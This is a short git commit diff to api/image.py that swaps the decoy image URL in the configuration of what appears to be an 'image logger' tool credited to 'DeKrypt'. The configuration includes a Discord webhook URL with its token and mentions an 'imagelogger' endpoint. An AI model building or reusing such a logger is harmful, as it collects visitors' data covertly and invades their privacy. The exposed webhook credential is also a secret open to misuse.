8eaf639bedcdc8118db90e4d8469ba9a1399780e
Kacper-ctrl-wqs <chatgiga72952@proton.me>
2025-11-22 11:55:10 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1441741845876179065/m4_F2obgbfFEtJLNNBP7FVWd2VUk0Yc1fTL29DUjltT3jaYgAcDyXB353vf-ZzresOfa",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "https://pixabay.com/pl/photos/jab%c5%82ko-kwiaty-wazon-martwa-natura-8378041", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
